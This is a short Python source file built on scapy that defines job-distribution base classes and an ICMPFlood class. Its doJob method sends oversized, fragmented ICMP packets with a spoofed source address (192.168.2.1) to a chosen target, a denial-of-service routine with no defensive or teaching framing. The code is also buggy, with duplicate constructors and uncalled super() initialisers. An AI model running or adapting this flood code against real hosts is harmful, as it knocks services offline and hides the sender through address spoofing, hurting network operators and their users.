from abc import ABC, abstractmethod
from scapy.all import *

class Job(ABC):
     jobGiver = ''
     jobTaker = []
     jobResult = ''

     def __init__(self):
          pass

     def __init__(self, jobGiver):
          self.jobGiver = jobGiver

     def setJobTaker(self, jobTaker):
          self.jobTaker.append(jobTaker)

     @abstractmethod
     def doJob(self):
          pass

class MultiJob(Job):

	takers = 0

	def __init__(self):
		super()
		takers = 0

	def addJobTaker(self, jobTaker):
		self.jobTaker.append(jobTaker)
		self.takers += 1

class ICMPFlood(MultiJob):

	target = ''

	def __init__(self):
		super()
		target = ''

	def __init__(self, arg1):
		super()
		self.target = arg1

	def doJob(self):
		ip_layer = IP(dst=self.target, src='192.168.2.1')
		icmp_layer = ICMP()
		packet = ip_layer/icmp_layer
		send(fragment(packet /("X"*60000)))
